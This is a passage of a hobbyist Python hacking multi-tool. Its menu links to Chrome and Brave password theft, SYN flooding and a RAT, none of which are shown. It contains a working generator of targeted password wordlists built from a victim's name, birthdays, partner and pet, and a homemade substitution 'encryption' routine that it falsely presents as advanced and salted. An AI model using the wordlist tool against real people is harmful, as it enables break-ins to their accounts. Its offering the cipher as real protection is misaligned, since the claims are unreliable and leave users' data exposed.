try:
    print("Initialising",end=" ")
    import time
    import ipinfo
    import sys
    import os
    import subprocess
    from termcolor import colored
    import dns.resolver
    import random
    import base64
    import time
    import cryptocode
    import json
    import sqlite3
    import win32crypt
    from Crypto.Cipher import AES
    import shutil
    from datetime import timezone, datetime, timedelta
    import random
    import requests
    from pprint import pprint
    from bs4 import BeautifulSoup as bs
    from urllib.parse import urljoin
    import pikepdf
    import cv2
    import numpy as np
    import socket
    from faker import Faker
    import pyshorteners
    import nmap
    from pytube import YouTube
    import speedtest as st
    import wifi_qrcode_generator.generator
    import argparse
    import sys , os , os.path , platform
    import re
    import time
    import pywifi
    from pywifi import PyWiFi
    from pywifi import const
    from pywifi import Profile
    from colorama import init
    from termcolor import colored
    from colorama import Fore, Back, Style
    from cryptography.fernet import Fernet
    import itertools
    import netifaces
    from pathlib import Path
    rows, cols = os.get_terminal_size()
    print("\n"*cols)
    esc=False
except Exception as e:
    print("ERROR IMPORTING PACKAGE(s):\n"+str(e))
    time.sleep(30)


error=""
#Most functions below are pieces of scripts created by adhrit the great over time compiled together

#Interface/Helping scripts ↓
def clear():
    rows, cols = os.get_terminal_size()
    print("\n"*cols)
def updating_print(message,exta_char=".",number=5,final=""):
    number=int(number)
    list=[0.3,0.5,0.8,1.1,1.4,1.7]
    print(str(message), end='', flush=True)
    number=number-1
    while number>0:
        tim=random.choice(list)
        time.sleep(tim)
        number=number-1
        print(str(exta_char), end='', flush=True)
    if not final:
        tim=random.choice(list)
        time.sleep(tim)
        print(str(exta_char), flush=True)
        tim=random.choice(list)
        time.sleep(tim)
    else:
        tim=random.choice(list)
        time.sleep(tim)
        print(str(exta_char), end='', flush=True)
        tim=random.choice(list)
        time.sleep(tim+1)
        x=" "+final
        time.sleep(1)
        print(x, flush=True)
def run_command(command):
    process = subprocess.run(command, shell=True, capture_output=True, text=True)
    output=process.stdout
    print(output)
    return str(output)
def rerender():
    #somehow go back to the curses interface
    print("somehow go back to the curses interface")
def run_script(name):
    print("run_script recieved:",name)
    name=name.lower()
    if "rock" in name and "paper" in name:
        clear()
        rockPaperScissors()
        rerender()
    elif "random" in name and "g" in name:
        clear()
        randomGuesser()
        rerender()
    elif "short" in name:
        clear()
        short()
        rerender()
    elif "youtube" in name:
        clear()
        youtube()
        rerender()
    elif "speed" in name:
        clear()
        speedtest()
        rerender()
    elif "wifi" in name and "qr" in name:
        clear()
        wifi_qr()
        rerender()
    elif "rat" in name:
        clear()
        theRAT()
        rerender()
    elif "crypto" in name:
        clear()
        cryptography()
        rerender()
    elif "dns" in name:
        clear()
        dnsenumeration()
        rerender()
    elif "ip" in name and "info" in name:
        clear()
        getipinfo()
        rerender()
    elif "ip" in name and "info" in name:
        clear()
        getipinfo()
        rerender()
    elif "dhcp" in name:
        clear()
        print("Even i dont know what i wrote there")
        dhcplistener()
        rerender()
    elif "chrome" in name:
        clear()
        chrome_pass()
        rerender()
    elif "brave" in name:
        clear()
        brave_pass()
        rerender()
    elif "syn" in name and "flood" in name:
        clear()
        print("Even i dont know what i wrote there")
        syn_flooding()
        rerender()
    elif "domain" in name and "sub" in name:
        domain=input("Domain:")
        print("fix this")
        clear()
        subdomains(domain)
        rerender()
    elif "pdf" in name:
        clear()
        pdfcrack()
        rerender()
    elif "fake" in name:
        clear()
        faker()
        rerender()
    elif "wifi" in name and "crack" in name:
        print("Not intergrated yet")






    elif "wifi" in name and len(name)<7:
        #open wifi selection
        in_main=False
        in_wifi=True








#Game scripts ↓
def rockPaperScissors():
    try:
        os.system("RockPaperScissors.exe")
    except Exception as e:
        print(" ")
        pass
def randomGuesser():
    try:
        os.system("RandomGuesser.exe")
    except Exception as e:
        print(" ")
        pass


#Tool scripts ↓
def short():
    url=input("Enter url: ").strip()
    shorteners=['tinyurl','dagd','clckru']
    use=random.choice(shorteners)
    updating_print("Using "+colored(use,"white",attrs=['bold'])+" for shortening")
    if use=='tinyurl':
        s = pyshorteners.Shortener()
        sh=s.tinyurl.short(url.strip())
        print(" ")
        time.sleep(2)
        print(colored("Shortened URL: ","cyan")+colored(sh,"cyan",attrs=['bold']))#done
    elif use=='dagd':
        s = pyshorteners.Shortener()
        sh=s.dagd.short(url.strip())
        print(" ")
        time.sleep(2)
        print(colored("Shortened URL: ","cyan")+colored(sh,"cyan",attrs=['bold']))#done
    elif use=='clckru':
        s = pyshorteners.Shortener()
        sh=s.clckru.short(url.strip())
        print(" ")
        time.sleep(2)
        print(colored("Shortened URL: ","cyan")+colored(sh,"cyan",attrs=['bold']))
def youtube():
    url=input("Enter url of video: ").strip()
    out_path=input("Enter download location: ").strip()
    link = str(url.strip())
    try:
        if "//" not in out_path:
            file_path=""
            for char in out_path:
                if char=="/" or char=="\\":
                    file_path=file_path+"//"
                else:
                    file_path=file_path+char

        else:
            file_path=out_path
        video = YouTube(link)
        updating_print("Searching",".",6,"✓")
        print("Title:", video.title)
        time.sleep(1)
        print("Length:", video.length, "seconds")
        time.sleep(4)
        print(" ")
        updating_print("Starting download to "+file_path)
        video.bypass_age_gate()
        video.streams.get_highest_resolution().download(output_path=file_path)
        print('Downloaded to',out_path)
    except Exception as e:
        print(colored("ERROR  ","red")+str(e))
def speedtest():
    server = st.Speedtest()
    try:
        server.get_best_server()
    except:
        print(colored("Unable to connect to server","red"))
    down = server.download()
    down = down / 1000000
    print("----------------------------------------------------------------")
    updating_print(colored("|Testing speed",'cyan'),colored(".","cyan",attrs=['bold']),8)
    time.sleep(2)
    print("|                                                              |")
    try:
        down=down.split(".")[0]
        up=up.split(".")[0]
    except:
        pass
    pri=colored(down,"cyan")
    print(f"|Download Speed: {pri} Mb/s")
    time.sleep(1)
    print("|                                                              |")
    up = server.upload()
    up = up / 1000000
    pri=colored(up,"cyan")
    print(f"|Upload Speed: {pri} Mb/s")
    time.sleep(1)
    print("|                                                              |")
    ping = server.results.ping
    pri=colored(ping,"cyan")
    print(f"|Ping Speed: {pri} Mb/s")
    time.sleep(1)
    print("----------------------------------------------------------------")#beta
def wifi_qr():
    SSID=input(colored("Enter SSID:","cyan")).strip()
    passwrd=input(colored("Enter wifi password:","cyan")).strip()
    qr_code = wifi_qrcode_generator.generator.wifi_qrcode(
        ssid=SSID, hidden=False, authentication_type='WPA', password=passwrd)
    qr_code.print_ascii()
    qr_code.make_image().save('qr.png')
    print(colored("Saved qr code to 'qr.png'","cyan",attrs=["bold"]))


#Hacking scripts ↓
def personal():
    print(" ")
    time.sleep(1)
    print("This can be used to generate unique password wordlists when the password used on an encrypted item is personal to the target\nBy "+colored("AdhritTheGreat","cyan"))
    time.sleep(9)
    print(" ")
    time.sleep(1)
    print(" ")
    time.sleep(1)
    print(" ")
    while True:
        name=input("First name of target:").strip().lower()
        name_cap=name.capitalize()
        year=input("Year of birth (Ex:1997):").strip().lower()
        month=input("Month of birth (Ex:05):").strip().lower()
        if month!="10" and "0" in month:
            month=month.strip("0")
        day=input("Day of birth (Ex:22):").strip().lower()
        age=input("Age(Ex:37):").strip().lower()
        print(" ")
        if "y" in input("Do they have a pet (y/n) :").strip().lower():
            do_pet=True
            pet_name=input("Name of pet:").strip().lower()
            pet_name_cap=pet_name.capitalize()
            pet_year=input("Year of birth of pet:").strip().lower()
            pet_month=input("Month of birth of pet:").strip().lower()
        else:
            do_pet=False
            pet_name=False
            pet_year=False
            pet_month=False
        print(" ")
        if "y" in input("Do they have a partner (y/n) :").strip().lower():
            do_partner=True
            partner_name=input("Name of partner:").strip().lower()
            partner_name_cap=partner_name.capitalize()
            partner_year=input("Year of birth of partner (Ex:1989):").strip().lower()
            partner_month=input("Month of birth of partner (Ex:09):").strip().lower()
            partner_day=input("Day of birth of partner: (Ex:29)").strip().lower()
        else:
            do_partner=False
            partner_name=False
            partner_year=False
            partner_month=False
            partner_day=False
        print(" ")
        time.sleep(2)
        print("Below fields are optional but increase accuracy\n(click enter to ignore these)")
        time.sleep(9)
        fav_num=input("Favourite/Lucky number:").strip().lower()
        if fav_num.strip()=="":
            fav_num=False
        fav_stuff=input("Favourite sports team/person/idol/etc:").strip().lower()
        if fav_stuff.strip()=="":
            fav_stuff=False
        print("")
        time.sleep(3)
        #break the loop
        if name and year and month and day and age:
            break


    gamma_test=False
    if gamma_test:
            print("If you know any of their old/unused personal password(s),")
            passwordas=input("enter here(seperate with commas):")
            more=False
            if len(passwordas)>3:
                if "," in passwordas:
                    more=True
                    password_list_macro=passwordas.split(",")
                    print(" ")
                else:
                    more=False
                    password_list_macro=passwordas.strip()
                    print(" ")
            else:
                password_list_macro=False
                passwordas=False
            print(password_list_macro)



    #Generate personal database
    print(" ")
    time.sleep(2.5)
    updating_print("Genterating",colored(".","cyan"),9,"✓")
    donsqjndj=True#do not change
    database=[]
    if donsqjndj:
        #Name+bday
        if donsqjndj:
            database.append(name_cap+"@"+day)
            database.append(name+"@"+day)
            database.append(name_cap+day)
            database.append(name+day)
            database.append(name_cap+day+"!")
            database.append(name+day+"!")
        #Name+common numbers
        if donsqjndj:
            database.append(name_cap+"1")
            database.append(name+"1")
            database.append(name_cap+"@1")
            database.append(name+"@1")
            database.append(name_cap+"12")
            database.append(name+"12")
            database.append(name_cap+"@12")
            database.append(name+"@12")
            database.append(name_cap+"123")
            database.append(name+"123")
            database.append(name_cap+"@123")
            database.append(name+"@123")
            database.append(name_cap+"1234")
            database.append(name+"1234")
            database.append(name_cap+"@1234")
            database.append(name+"@1234")
            database.append(name_cap+"12345")
            database.append(name+"12345")
            database.append(name_cap+"@12345")
            database.append(name+"@12345")
            database.append(name_cap+"123456")
            database.append(name+"123456")
            database.append(name_cap+"@123456")
            database.append(name+"@123456")
            database.append(name_cap+"1234567")
            database.append(name+"1234567")
            database.append(name_cap+"@1234567")
            database.append(name+"@1234567")
            database.append(name_cap+"12345678")
            database.append(name+"12345678")
            database.append(name_cap+"@12345678")
            database.append(name+"@12345678")
        #Name+bday+partner bday
        if donsqjndj:
            if do_partner:
                database.append(name_cap+"@"+day+partner_day)
                database.append(name+"@"+day+partner_day)
                database.append(name_cap+day+partner_day)
                database.append(name+day+partner_day)
        #Name+partner bday+bday
        if donsqjndj:
            if do_partner:
                database.append(name_cap+"@"+partner_day+day)
                database.append(name+"@"+partner_day+day)
                database.append(name_cap+partner_day+day)
                database.append(name+partner_day+day)
        #Partner Name+bday+partner bday
        if donsqjndj:
            if do_partner:
                database.append(name_cap+"@"+day+partner_day)
                database.append(name+"@"+day+partner_day)
                database.append(name_cap+day+partner_day)
                database.append(name+day+partner_day)
        #Partner Name+partner bday+bday
        if donsqjndj:
            if do_partner:
                database.append(name_cap+"@"+partner_day+day)
                database.append(name+"@"+partner_day+day)
                database.append(name_cap+partner_day+day)
                database.append(name+partner_day+day)

        #Randomized
        if donsqjndj:
            results = []
            fields = [name, year, month, day, age]
            if do_pet:
                fields.append(pet_name)
                fields.append(pet_year)
                fields.append(pet_month)
            if do_partner:
                fields.append(partner_name)
                fields.append(partner_year)
                fields.append(partner_month)
                fields.append(partner_day)
            if fav_num:
                fields.append(fav_num)
            if fav_stuff:
                fields.append(fav_stuff)
            combinations = itertools.permutations(fields, 2)
            for combination in combinations:
                result = str(combination[0]) + str(combination[1])
                results.append(result)
                result = str(combination[0]) +"@"+ str(combination[1])
                results.append(result)

            for item in results:
                database.append(item)
        #Just fav_num
        if donsqjndj:
            database.append(fav_num)



    clear()
    time.sleep(3)
    print(colored("Generated Wordlist","cyan",attrs=["bold"])+colored(" - "+str(len(database))+"characters","cyan"))
    print(" ")
    time.sleep(7.5)
    clear()
    return database
def theRAT():
    print("Under dev")
def cryptography():
    #Created:Apr2022  TimeTaken:Approx1month
    #import random
    #import base64
    #import time
    #import cryptocode(all imported at start of this file)
    print(" ")
    xoll=input("Encryptor / Decryptor : ")
    time.sleep(1)
    print(" ")
    if ("e" in xoll.lower()) and ("n" in xoll.lower()) and ("d" not in xoll.lower()):
        a="aj"
        b="bj"
        c="cj"
        d="dj"
        e="ej"
        f="fj"
        g="gj"
        h="hj"
        i="ij"
        j="jj"
        k="kj"
        l="lj"
        m="mj"
        n="nj"
        o="oj"
        p="pj"
        q="qj"
        r="rj"
        s="sj"
        t="tj"
        u="uj"
        v="vj"
        w="wj"
        x="xj"
        y="yj"
        z="zj"
        zero=""
        one=""
        two=""
        three=""
        four=""
        five=""
        six=""
        seven=""
        eight=""
        nine=""
        pl="!"
        pp="@"
        pq="#"
        pr="&"
        pu="("
        pj=")"
        pf="/"
        pa="$"
        ps="+"
        pd="-"
        po="="
        pi="?"

        print("Advanced encryption activating....")

        time.sleep(3)
        print(" ")
        worlookj=input("Enter the text you want to encrypt: ")
        time.sleep(2)
        xacrt=["adbd","ajct","akno","popd","wjci","ncgf","jbfi","hfgi","nvhi","rivw","qobn","cogm","ondi","onll","psok","mjjk","odpl","neie","jsdi","baci","nfcs","kskio","jkbi","lomp","hvji","0893","1245","8903","9028","1120","8620","0029","7891","9753","5019","6930","7890","0389"]
        xlopik=random.choice(xacrt)
        def split(worlookj):
            return [char for char in worlookj]
        xppol=split(worlookj)
        numbrs=[">","@","*","~","#","-","|","!",")","$"]

        yiok=len(xppol)
        listop=""
        lok=[]
        lopkji=["1","2","3","4","5","6","7","8","9","€","£","₹"]
        xkio=0
        run_code=0
        bumml=["!",")","(","*","&","^","%","$","#","@"]
        lopko=["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"]
        let=[4,5,6]
        letfront=random.choice(let)
        letback=random.choice(let)
        letfron=letfront
        letbac=letback
        numfront=""
        numback=""
        while letfron!=0:
            klopil=random.choice(lopko)
            numfront=numfront+klopil
            letfron=letfron-1
        while letbac!=0:
            klopil=random.choice(lopko)
            numback=numback+klopil
            letbac=letbac-1




        tklop=1
        while tklop>0:
            if a=="aj":
                ka=a
                while True:
                    a=random.choice(lopko)
                    if (a!="a") and (a not in lok):
                        lok.append(a)
                        break
                    elif (a=="a") or (a in lok):
                        a=ka


            elif b=="bj":
                kb=b
                while True:
                    b=random.choice(lopko)
                    if (b!="b") and (b not in lok):
                        lok.append(b)
                        break
                    elif (b=="b") or (b in lok):
                        b=kb

            elif c=="cj":
                kc=c
                while True:
                    c=random.choice(lopko)
                    if (c!="c") and (c not in lok):
                        lok.append(c)
                        break
                    elif (c=="c") or (c in lok):
                        c=kc

            elif d=="dj":
                kd=d
                while True:
                    d=random.choice(lopko)
                    if (d!="d") and (d not in lok):
                        lok.append(d)
                        break
                    elif (d=="d") or (d in lok):
                        d=kd

            elif e=="ej":
                ke=e
                while True:
                    e=random.choice(lopko)
                    if (e!="e") and (e not in lok):
                        lok.append(e)
                        break
                    elif (e=="e") or (e in lok):
                        e=ke


            elif f=="fj":
                kf=f
                while True:
                    f=random.choice(lopko)
                    if (f!="f") and (f not in lok):
                        lok.append(f)
                        break
                    elif (f=="f") or (f in lok):
                        f=kf



            elif g=="gj":
                kg=g
                while True:
                    g=random.choice(lopko)
                    if (g!="g") and (g not in lok):
                        lok.append(g)
                        break
                    elif (g=="g") or (g in lok):
                        g=kg


            elif h=="hj":
                kh=h
                while True:
                    h=random.choice(lopko)
                    if (h!="h") and (h not in lok):
                        lok.append(h)
                        break
                    elif (h=="h") or (h in lok):
                        h=kh


            elif i=="ij":
                ki=i
                while True:
                    i=random.choice(lopko)
                    if (i!="i") and (i not in lok):
                        lok.append(i)
                        break
                    elif (i=="i") or (i in lok):
                        i=ki


            elif j=="jj":
                kj=j
                while True:
                    j=random.choice(lopko)
                    if (j!="j") and (j not in lok):
                        lok.append(j)
                        break
                    elif (j=="j") or (j in lok):
                        j=kj



            elif k=="kj":
                kk=k
                while True:
                    k=random.choice(lopko)
                    if (k!="k") and (k not in lok):
                        lok.append(k)
                        break
                    elif (k=="k") or (k in lok):
                        k=kk


            elif l=="lj":
                kl=l
                while True:
                    l=random.choice(lopko)
                    if (l!="l") and (l not in lok):
                        lok.append(l)
                        break
                    elif (l=="l") or (l in lok):
                        l=kl


            elif m=="mj":
                km=m
                while True:
                    m=random.choice(lopko)
                    if (m!="m") and (m not in lok):
                        lok.append(m)
                        break
                    elif (m=="m") or (m in lok):
                        m=km


            elif n=="nj":
                kn=n
                while True:
                    n=random.choice(lopko)
                    if (n!="n") and (n not in lok):
                        lok.append(n)
                        break
                    elif (n=="n") or (n in lok):
                        n=kn



            elif o=="oj":
                ko=o
                while True:
                    o=random.choice(lopko)
                    if (o!="o") and (o not in lok):
                        lok.append(o)
                        break
                    elif (o=="o") or (o in lok):
                        o=ko


            elif p=="pj":
                kp=p
                while True:
                    p=random.choice(lopko)
                    if (p!="p") and (p not in lok):
                        lok.append(p)
                        break
                    elif (p=="p") or (p in lok):
                        p=kp


            elif q=="qj":
                kq=q
                while True:
                    q=random.choice(lopko)
                    if (q!="q") and (q not in lok):
                        lok.append(q)
                        break
                    elif (q=="q") or (q in lok):
                        q=kq


            elif r=="rj":
                kr=r
                while True:
                    r=random.choice(lopko)
                    if (r!="r") and (r not in lok):
                        lok.append(r)
                        break
                    elif (r=="r") or (r in lok):
                        r=kr


            elif s=="sj":
                ks=s
                while True:
                    s=random.choice(lopko)
                    if (s!="s") and (s not in lok):
                        lok.append(s)
                        break
                    elif (s=="s") or (s in lok):
                        s=ks


            elif t=="tj":
                kt=t
                while True:
                    t=random.choice(lopko)
                    if (t!="t") and (t not in lok):
                        lok.append(t)
                        break
                    elif (t=="t") or (t in lok):
                        t=kt


            elif u=="uj":
                ku=u
                while True:
                    u=random.choice(lopko)
                    if (u!="u") and (u not in lok):
                        lok.append(u)
                        break
                    elif (u=="u") or (u in lok):
                        u=ku


            elif v=="vj":
                kv=v
                while True:
                    v=random.choice(lopko)
                    if (v!="v") and (v not in lok):
                        lok.append(v)
                        break
                    elif (v=="v") or (v in lok):
                        v=kv


            elif w=="wj":
                kw=w
                while True:
                    w=random.choice(lopko)
                    if (w!="w") and (w not in lok):
                        lok.append(w)
                        break
                    elif (w=="w") or (w in lok):
                        w=kw


            elif x=="xj":
                kx=x
                while True:
                    x=random.choice(lopko)
                    if (x!="x") and (x not in lok):
                        lok.append(x)
                        break
                    elif (x=="x") or (x in lok):
                        x=kx


            elif y=="yj":
                ky=y
                while True:
                    y=random.choice(lopko)
                    if (y!="y") and (y not in lok):
                        lok.append(y)
                        break
                    elif (y=="y") or (y in lok):
                        y=ky


            elif z=="zj":
                kz=z
                while True:
                    z=random.choice(lopko)
                    if (z!="z") and (z not in lok):
                        lok.append(z)
                        break
                    elif (z=="z") or (z in lok):
                        z=kz
            elif zero=="":
                zer=zero
                while True:
                    zero=random.choice(numbrs)
                    if (zero not in lok):
                        lok.append(zero)
                        break
                    elif (zero in lok):
                        zero=zer

            elif one=="":
                on=one
                while True:
                    one=random.choice(numbrs)
                    if (one not in lok):
                        lok.append(one)
                        break
                    elif (one in lok):
                        one=on

            elif two=="":
                tw=two
                while True:
                    two=random.choice(numbrs)
                    if (two not in lok):
                        lok.append(two)
                        break
                    elif (two in lok):
                        two=tw
            elif three=="":
                thre=three
                while True:
                    three=random.choice(numbrs)
                    if (three not in lok):
                        lok.append(three)
                        break
                    elif (three in lok):
                        three=thre
            elif four=="":
                fou=four
                while True:
                    four=random.choice(numbrs)
                    if (four not in lok):
                        lok.append(four)
                        break
                    elif (four in lok):
                        four=fou
            elif five=="":
                fiv=five
                while True:
                    five=random.choice(numbrs)
                    if (five not in lok):
                        lok.append(five)
                        break
                    elif (five in lok):
                        five=fiv
            elif six=="":
                si=six
                while True:
                    six=random.choice(numbrs)
                    if (six not in lok):
                        lok.append(six)
                        break
                    elif (six in lok):
                        six=si
            elif seven=="":
                seve=seven
                while True:
                    seven=random.choice(numbrs)
                    if (seven not in lok):
                        lok.append(seven)
                        break
                    elif (seven in lok):
                        seven=seve

            elif eight=="":
                eigh=eight
                while True:
                    eight=random.choice(numbrs)
                    if (eight not in lok):
                        lok.append(eight)
                        break
                    elif (eight in lok):
                        eight=eigh
            elif nine=="":
                nin=nine
                while True:
                    nine=random.choice(numbrs)
                    if (nine not in lok):
                        lok.append(nine)
                        break
                    elif (nine in lok):
                        nine=nin
            elif pp=="@":
                ppa=pp
                while True:
                    pp=random.choice(lopkji)
                    if (pp not in lok):
                        lok.append(pp)
                        break
                    elif (pp in lok):
                        pp=ppa
            elif pl=="!":
                pla=pl
                while True:
                    pl=random.choice(lopkji)
                    if (pl not in lok):
                        lok.append(pl)
                        break
                    elif (pl in lok):
                        pl=pla
            elif pq=="#":
                pqa=pq
                while True:
                    pq=random.choice(lopkji)
                    if (pq not in lok):
                        lok.append(pq)
                        break
                    elif (pq in lok):
                        pq=pqa
            elif pr=="&":
                pra=pr
                while True:
                    pr=random.choice(lopkji)
                    if (pr not in lok):
                        lok.append(pr)
                        break
                    elif (pr in lok):
                        pr=pra
            elif pu=="(":
                pua=pu
                while True:
                    pu=random.choice(lopkji)
                    if (pu not in lok):
                        lok.append(pu)
                        break
                    elif (pu in lok):
                        pu=pua
            elif pj==")":
                pja=pj
                while True:
                    pj=random.choice(lopkji)
                    if (pj not in lok):
                        lok.append(pj)
                        break
                    elif (pj in lok):
                        pj=pja
            elif pa=="$":
                paa=pa
                while True:
                    pa=random.choice(lopkji)
                    if (pa not in lok):
                        lok.append(pa)
                        break
                    elif (pa in lok):
                        pa=paa
            elif ps=="+":
                psa=ps
                while True:
                    ps=random.choice(lopkji)
                    if (ps not in lok):
                        lok.append(ps)
                        break
                    elif (ps in lok):
                        ps=psa
            elif pd=="-":
                pda=pd
                while True:
                    pd=random.choice(lopkji)
                    if (pd not in lok):
                        lok.append(pd)
                        break
                    elif (pd in lok):
                        pd=pda
            elif po=="=":
                poa=po
                while True:
                    po=random.choice(lopkji)
                    if (po not in lok):
                        lok.append(po)
                        break
                    elif (po in lok):
                        po=poa
            elif pi=="?":
                pia=pi
                while True:
                    pi=random.choice(lopkji)
                    if (pi not in lok):
                        lok.append(pi)
                        break
                    elif (pi in lok):
                        pi=pia
            elif pf=="/":
                pfa=pf
                while True:
                    pf=random.choice(lopkji)
                    if (pf not in lok):
                        lok.append(pf)
                        break
                    elif (pf in lok):
                        pf=pfa
            elif (a!="aj") and (b!="bj") and (c!="cj") and (d!="dj") and (e!="ej") and (f!="fj") and (g!="gj") and (h!="hj") and (i!="ij") and (j!="jj") and (k!="kj") and (l!="lj") and (m!="mj") and (n!="nj") and (o!="oj") and (p!="pj") and (q!="qj") and (r!="rj") and (s!="sj") and (t!="tj") and (u!="uj") and (v!="vj") and (w!="wj") and (x!="xj") and (y!="yj") and (z!="zj"):
                time.sleep(1)
                print(" ")
                print("Collecting letters....")
                time.sleep(3)
                print(" ")
                print("Adding salt....")
                print(" ")
                time.sleep(3)
                print("Starting encryption....")
                print(" ")
                time.sleep(3)
                tklop=tklop-1

        for char in xppol:
                char=str(char)
                if char.lower()=="a":
                    listop=listop+a
                elif char.lower()=="b":
                    listop=listop+b
                elif char.lower()=="c":
                    listop=listop+c
                elif char.lower()=="d":
                    listop=listop+d
                elif char.lower()=="e":
                    listop=listop+e
                elif char.lower()=="f":
                    listop=listop+f
                elif char.lower()=="g":
                    listop=listop+g
                elif char.lower()=="h":
                    listop=listop+h
                elif char.lower()=="i":
                    listop=listop+i
                elif char.lower()=="j":
                    listop=listop+j
                elif char.lower()=="k":
                    listop=listop+k
                elif char.lower()=="l":
                    listop=listop+l
                elif char.lower()=="m":
                    listop=listop+m
                elif char.lower()==" ":
                    listop=listop+"/"
                elif char.lower()=="n":
                    listop=listop+n
                elif char.lower()=="o":
                    listop=listop+o
                elif char.lower()=="p":
                    listop=listop+p
                elif char.lower()=="q":
                    listop=listop+q
                elif char.lower()=="r":
                    listop=listop+r
                elif char.lower()=="s":
                    listop=listop+s
                elif char.lower()=="t":
                    listop=listop+t
                elif char.lower()=="u":
                    listop=listop+u
                elif char.lower()=="v":
                    listop=listop+v
                elif char.lower()=="w":
                    listop=listop+w
                elif char.lower()=="x":
                    listop=listop+x
                elif char.lower()=="y":
                    listop=listop+y
                elif char.lower()=="z":
                    listop=listop+z
                elif char.lower()=="0":
                    listop=listop+zero
                elif char.lower()=="1":
                    listop=listop+one
                elif char.lower()=="2":
                    listop=listop+two
                elif char.lower()=="3":
                    listop=listop+three
                elif char.lower()=="4":
                    listop=listop+four
                elif char.lower()=="5":
                    listop=listop+five
                elif char.lower()=="6":
                    listop=listop+six
                elif char.lower()=="7":
                    listop=listop+seven
                elif char.lower()=="8":
                    listop=listop+eight
                elif char.lower()=="9":
                    listop=listop+nine
                elif char.lower()=="!":
                    listop=listop+pl
                elif char.lower()=="@":
                    listop=listop+pp
                elif char.lower()=="#":
                    listop=listop+pq
                elif char.lower()=="&":
                    listop=listop+pr
                elif char.lower()=="(":
                    listop=listop+pu
                elif char.lower()==")":
                    listop=listop+pj
                elif char.lower()=="$":
                    listop=listop+pa
                elif char.lower()=="+":
                    listop=listop+ps
                elif char.lower()=="-":
                    listop=listop+pd
                elif char.lower()=="=":
                    listop=listop+po
                elif char.lower()=="?":
                    listop=listop+pi
        xyza=["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","x","y","z"]
        flubbero=""

        listop=numfront+listop+numback

        while len(flubbero)<10:
            xyzb=random.choice(xyza)
            flubbero=flubbero+xyzb
        chubb=listop
        str_encoded = cryptocode.encrypt(chubb,flubbero)
        listop=str_encoded
        xopli=20598376985367568756956548765489675976539868450445687456985769846909698595886958596869869696909698595886958596869869696
        print(" ")
        print(" ")
        while xopli>0:
            xopli=xopli-5999999999999000939479890435886745986750679858679487696568969096985958869585968698696969096985958869585968698696969
            print(xopli, end="\r")
            xopli=xopli+100009869578968
            print(xopli, end="\r")
        print(" ")
        xkolpil=35
        while xkolpil>0:
            print(" ")
            xkolpil=xkolpil-1
        time.sleep(0.5)
        print("Preparing encrypted sentence....")
        time.sleep(3)
        print(" ")
        print("Preparing decryption code....")
        print(" ")
        time.sleep(3)
        print(" ")
        print(" ")
        print(" ")
        print(" ")
        print(" ")
        print(" ")
        print(" ")
        print(" ")
        print(" ")
        print(" ")
        print(" ")
        print(" ")
        print(" ")
        print(" ")
        print(" ")
        xopolo=' Encrypted sentence: '+listop
        time.sleep(0.5)
        print(xopolo)
        letfront=str(letfront)
        letback=str(letback)
        decrypc=a+n+b+o+c+p+d+q+e+r+f+s+g+t+h+u+i+v+j+w+k+x+l+y+m+z+zero+nine+seven+two+eight+one+three+six+four+five+pl+pp+pq+pr+pu+pj+pa+ps+pd+po+pi+pf+flubbero+letfront+letback

        time.sleep(1)
        print(" ")
        time.sleep(1)
        decryk=" Decryption code:   "+decrypc
        time.sleep(0.5)
        print(decryk)
        if run_code>0:
            time.sleep(0.5)
            print(" ")
            print(" ")
            print(" ")
            print("Run code error:",run_code)
            time.sleep(0.5)
            print("An error has been encountered and our your sentence might be incorrectly crypted, please delete your sentence and retry.")
            time.sleep(3)




        else:
            print(" ")
            print(" ")
            print(" ")
            print(" ")
            time.sleep(1)
            print("If you want to decrypt this, go to the decryptor, enter the encrypted sentence and then enter the decryption code")
            print(" ")
            print(" ")
            print(" ")
            print(" ")
            print(" ")
            print(" ")
            print(" ")
            print(" ")
            print(" ")
            print(" ")
            print(" ")
            print(" ")
            print(" ")
            print(" ")


    elif ("d" in xoll.lower()) and ("e" in xoll.lower()) and ("n" not in xoll.lower()):
        time.sleep(1)
        print("Advanced decryption activated")
        def split(sent):
            return [char for char in sent]
        while True:
            time.sleep(1)
            print(" ")
            depil=input("Enter your decryption code: ")
            depil=depil.strip()
            if (len(depil)>59) and (len(depil)<61):
                time.sleep(0.5)
                print(" ")
                print("Checking......")
                time.sleep(2)
                break
            else:
                time.sleep(0.5)
                print(" ")
                print("Retry :(")
                time.sleep(0.5)



        fop=depil
        a=fop[0]
        n=fop[1]
        b=fop[2]
        o=fop[3]
        c=fop[4]
        p=fop[5]
        d=fop[6]
        q=fop[7]
        e=fop[8]
        r=fop[9]
        f=fop[10]
        s=fop[11]
        g=fop[12]
        t=fop[13]
        h=fop[14]
        u=fop[15]
        i=fop[16]
        v=fop[17]
        j=fop[18]
        w=fop[19]
        k=fop[20]
        x=fop[21]
        l=fop[22]
        y=fop[23]
        m=fop[24]
        z=fop[25]
        zero=fop[26]
        nine=fop[27]
        seven=fop[28]
        two=fop[29]
        eight=fop[30]
        one=fop[31]
        three=fop[32]
        six=fop[33]
        four=fop[34]
        five=fop[35]
        pl=fop[36]
        pp=fop[37]
        pq=fop[38]
        pr=fop[39]
        pu=fop[40]
        pj=fop[41]
        pa=fop[42]
        ps=fop[43]
        pd=fop[44]
        po=fop[45]
        pi=fop[46]
        pf=fop[47]


        ar=fop[48]
        br=fop[49]
        cr=fop[50]
        dr=fop[51]
        er=fop[52]
        fr=fop[53]
        gr=fop[54]
        hr=fop[55]
        ir=fop[56]
        jr=fop[57]


        salta=fop[58]
        saltb=fop[59]


        time.sleep(0.5)
        print(" ")
        print("Unpacking decryption code....")
        time.sleep(0.5)
        time.sleep(3)
        flubbero=ar+br+cr+dr+er+fr+gr+hr+ir+jr
        print(" ")
        sent=input("Enter the encrypted sentence: ")
        time.sleep(0.5)
        depil=sent.strip()
        time.sleep(0.5)
        time.sleep(1)


        str_=depil.strip()
        print(" ")
        print("Collecting decryption package....")
        time.sleep(3)
        print(" ")
        print("Decryption starting....")
        print(" ")
        _decoded = cryptocode.decrypt(str_, flubbero)
        sent=_decoded
        xppol=split(sent)
        listop=""
        for char in xppol:
            char=str(char)
            if char==a:
                listop=listop+"a"
            elif char==b:
                listop=listop+"b"
            elif char==c:
                listop=listop+"c"
            elif char==d:
                listop=listop+"d"
            elif char==e:
                listop=listop+"e"
            elif char==f:
                listop=listop+"f"
            elif char==g:
                listop=listop+"g"
            elif char==h:
                listop=listop+"h"
            elif char==i:
